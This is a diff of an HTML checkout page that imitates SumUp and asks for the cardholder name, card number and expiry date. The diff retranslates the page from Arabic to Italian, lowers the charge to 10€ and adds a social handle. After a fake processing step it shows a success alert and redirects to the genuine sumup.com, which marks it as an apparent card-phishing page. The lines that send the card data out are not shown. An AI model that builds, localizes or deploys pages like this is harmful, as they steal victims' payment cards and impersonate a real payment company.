@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SumUp - اشتراك VIP</title>
+    <title>SumUp -paga</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
         *{margin:0;padding:0;box-sizing:border-box}
@@ -83,28 +83,28 @@
     <div class="container">
         <div class="logo">SumUp <span class="logo-icon">€</span></div>
         
-        <div class="plan-title">✅ اشتراك VIP شهري - خطة أوروبية</div>
+        <div class="plan-title"> @aldo_footlocker</div>
         
         <div class="amount-box">
             <div class="amount-big" id="amountNum">19</div>
             <div class="currency-big" id="currencySym">€</div>
-            <span style="font-size:14px;color:#94a3b8;">/ شهرياً • تلقائي</span>
+            <span style="font-size:14px;color:#94a3b8;">/paga• </span>
         </div>
         
         <form id="payForm">
             <div class="input-group">
-                <label class="input-label">الاسم الكامل على البطاقة</label>
-                <input class="input-field" type="text" id="name" placeholder="أحمد محمد علي" required>
+                <label class="input-label">Nome completo sulla carta</label>
+                <input class="input-field" type="text" id="name" placeholder="Nome e Cognome" required>
             </div>
             
             <div class="input-group">
-                <label class="input-label">رقم البطاقة الائتمانية</label>
+                <label class="input-label">Numero di carta di credito</label>
                 <input class="input-field" type="text" id="card" placeholder="1234 5678 9012 3456" maxlength="19" required>
             </div>
             
             <div class="cvv-row">
                 <div class="input-group">
-                    <label class="input-label">تاريخ الإنتهاء</label>
+                    <label class="input-label">Data di fine</label>
                     <input class="input-field" type="text" id="expire" placeholder="MM/YY" maxlength="5" required>
                 </div>
                 <div class="input-group">
@@ -114,7 +114,7 @@
             </div>
             
             <button type="submit" class="pay-btn">
-                💳 دفع 19€ آمن الآن
+              paga 10€
             </button>
         </form>
         
@@ -126,8 +126,8 @@
     <div class="loading" id="loader">
         <div class="loading-content">
             <div class="spinner"></div>
-            <h3>⏳ معالجة الدفع €19</h3>
-            <p>جاري التحقق من البطاقة الأوروبية...</p>
+            <h3> Pagando 10€</h3>
+            <p>La carta è verificata egitto...</p>
         </div>
     </div>
 
@@ -193,7 +193,7 @@
             
             setTimeout(()=>{
                 if(ok){
-                    alert('✅ تم الدفع 19€ بنجاح!\nالفاتورة مرسلة');
+                    alert('✅ تم الدفع 10€ بنجاح!\nالفاتورة مرسلة');
                     window.location.href = 'https://sumup.com';
                 }else{
                     alert('❌ خطأ - جرب تاني');
